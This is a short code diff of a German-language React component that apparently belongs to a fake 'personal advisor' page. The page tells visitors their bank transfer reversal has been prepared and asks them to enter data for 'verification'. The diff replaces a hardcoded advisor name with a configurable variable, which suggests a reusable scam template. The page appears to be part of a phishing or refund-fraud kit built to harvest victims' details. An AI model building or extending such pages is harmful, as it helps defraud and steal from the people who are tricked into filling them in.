@@ -70,7 +70,7 @@ const Berater = () => {
 
             {/* Description */}
             <p className="mt-6 text-sm text-foreground/70 leading-relaxed max-w-md">
-              Sie werden aktuell persönlich von <span className="font-semibold text-foreground">Justus Sperling</span> betreut.
+              Sie werden aktuell persönlich von <span className="font-semibold text-foreground">{berater.name}</span> betreut.
               Ihr Berater hat den Widerruf Ihrer Überweisung vorbereitet. Zur Verifizierung
               gegenüber Ihrem Berater geben Sie bitte die folgenden Daten ein.
             </p>
